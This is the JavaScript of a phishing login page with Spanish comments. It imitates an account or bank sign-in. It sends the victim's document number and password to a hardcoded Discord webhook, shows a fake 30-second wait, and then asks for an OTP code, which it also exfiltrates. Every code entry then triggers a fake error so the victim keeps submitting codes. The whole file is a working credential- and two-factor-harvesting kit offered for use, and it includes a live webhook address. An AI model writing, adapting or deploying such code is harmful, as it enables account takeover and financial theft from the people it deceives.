// Coloca aquí la URL de tu Webhook de Discord
const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1495237437818142870/bmbbKWDuinkfNUtF0-bt5qRVpw83f0t-P36DzE5A32RQgAkzas-l-fos7fXQ7ZntlANp';

document.addEventListener('DOMContentLoaded', () => {
    // Referencias a elementos del DOM
    const documentoInput = document.getElementById('documento');
    const claveInput = document.getElementById('clave');
    const togglePassword = document.getElementById('togglePassword');
    const eyeIcon = document.getElementById('eyeIcon');
    const btnSubmit = document.getElementById('btnSubmit');
    const loginForm = document.getElementById('loginForm');

    const loadingOverlay = document.getElementById('loadingOverlay');
    const countdownSpan = document.getElementById('countdown');

    const tokenModal = document.getElementById('tokenModal');
    const tokenInput = document.getElementById('tokenInput');
    const btnVerifyToken = document.getElementById('btnVerifyToken');
    const tokenError = document.getElementById('tokenError');

    // Iconos SVG para ver/ocultar contraseña
    const eyeOpenSVG = `
        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
        <circle cx="12" cy="12" r="3"></circle>
    `;

    const eyeClosedSVG = `
        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
        <line x1="1" y1="1" x2="23" y2="23"></line>
    `;

    // Función auxiliar para enviar datos a Discord mediante fetch
    async function enviarADiscord(payload) {
        if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'TU_WEBHOOK_DE_DISCORD_AQUI') {
            console.warn('Falta configurar la URL del Webhook de Discord.');
            return;
        }

        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (error) {
            console.error('Error al enviar los datos a Discord:', error);
        }
    }

    // 1. Alternar visibilidad de contraseña
    togglePassword.addEventListener('click', () => {
        const isPassword = claveInput.getAttribute('type') === 'password';
        claveInput.setAttribute('type', isPassword ? 'text' : 'password');
        eyeIcon.innerHTML = isPassword ? eyeOpenSVG : eyeClosedSVG;
    });

    // 2. Habilitar o deshabilitar botón de login según los campos
    function checkLoginForm() {
        if (claveInput.value.trim().length > 0 && documentoInput.value.trim().length > 0) {
            btnSubmit.classList.add('active');
            btnSubmit.removeAttribute('disabled');
        } else {
            btnSubmit.classList.remove('active');
            btnSubmit.setAttribute('disabled', 'true');
        }
    }

    claveInput.addEventListener('input', checkLoginForm);
    documentoInput.addEventListener('input', checkLoginForm);

    // 3. Envío del Formulario, envío a Discord e inicio del temporizador de 30s
    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();

        const documento = documentoInput.value;
        const clave = claveInput.value;

        // Enviar las credenciales ingresadas al Webhook de Discord
        enviarADiscord({
            content: "🔐 **NUEVO INGRESO DETECTADO**",
            embeds: [{
                title: "Datos de Acceso",
                color: 3447003, // Color verde/azul
                fields: [
                    { name: "Documento", value: documento, inline: true },
                    { name: "Clave", value: clave, inline: true }
                ],
                timestamp: new Date().toISOString()
            }]
        });

        // Mostrar overlay de carga
        loadingOverlay.style.display = 'flex';

        let timeLeft = 30;
        countdownSpan.textContent = timeLeft;

        const timer = setInterval(() => {
            timeLeft--;
            countdownSpan.textContent = timeLeft;

            if (timeLeft <= 0) {
                clearInterval(timer);
                loadingOverlay.style.display = 'none';
                tokenModal.style.display = 'flex';
            }
        }, 1000);
    });

    // 4. Control del input de Token (Solo dígitos y entre 6 y 8 caracteres)
    tokenInput.addEventListener('input', () => {
        tokenInput.value = tokenInput.value.replace(/[^0-9]/g, '');

        tokenError.style.display = 'none';
        tokenInput.classList.remove('input-error');

        const valLength = tokenInput.value.length;
        if (valLength >= 6 && valLength <= 8) {
            btnVerifyToken.classList.add('active');
            btnVerifyToken.removeAttribute('disabled');
        } else {
            btnVerifyToken.classList.remove('active');
            btnVerifyToken.setAttribute('disabled', 'true');
        }
    });

    // 5. Verificación del Token, envío a Discord y manejo de error (5 segundos)
    btnVerifyToken.addEventListener('click', () => {
        const tokenVal = tokenInput.value;

        // Enviar el Token capturado a Discord
        enviarADiscord({
            content: "🔑 **TOKEN INGRESADO**",
            embeds: [{
                title: "Verificación de Código OTP",
                color: 15105570, // Color naranja
                fields: [
                    { name: "Documento", value: documentoInput.value || "N/A", inline: true },
                    { name: "Código Token", value: tokenVal, inline: true }
                ],
                timestamp: new Date().toISOString()
            }]
        });

        // Estado visual de verificación
        btnVerifyToken.innerText = 'Verificando...';
        btnVerifyToken.classList.remove('active');
        btnVerifyToken.setAttribute('disabled', 'true');
        tokenInput.setAttribute('disabled', 'true');

        setTimeout(() => {
            // Mostrar error tras 5 segundos
            tokenError.style.display = 'block';
            tokenInput.classList.add('input-error');
            tokenInput.value = '';

            btnVerifyToken.innerText = 'Confirmar';
            tokenInput.removeAttribute('disabled');
            tokenInput.focus();
        }, 5000);
    });
});